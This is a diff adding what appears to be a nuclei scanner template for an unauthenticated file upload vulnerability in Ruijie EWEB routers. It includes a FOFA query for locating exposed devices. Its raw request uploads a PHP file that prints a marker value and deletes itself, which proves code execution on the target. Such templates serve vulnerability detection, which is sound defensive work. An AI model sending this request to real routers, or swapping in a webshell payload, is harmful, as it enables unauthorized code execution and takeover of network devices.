@@ -1,0 +1,28 @@
+http:
+    - raw:
+        - "POST /ddi/server/fileupload.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXarDTbMzZe2hdNu2\n\n------WebKitFormBoundaryXarDTbMzZe2hdNu2\nContent-Disposition: form-data; name=\"uploadDir\"\n\nupload\n------WebKitFormBoundaryXarDTbMzZe2hdNu2\nContent-Disposition: form-data; name=\"file\";filename=\"{{username}}.php\"\n\n<?php print(1111*2222);unlink(__FILE__);?>\n------WebKitFormBoundaryXarDTbMzZe2hdNu2--\n"
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "2468642"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - "GET /ddi/server/upload/{{username}}.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\n"
+id: ruijieEWEB-fileupload_php-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: title="锐捷网络-EWEB网管系统"
+        锐捷EWEB路由器 fileupload.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。
+    name: 锐捷EWEB路由器 fileupload.php 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/WNx1Cmd0_d3HvoKJeNXN5A
+    severity: high
+    tags:
+        - 锐捷eweb
+variables:
+    username: '{{to_lower(rand_base(6))}}'
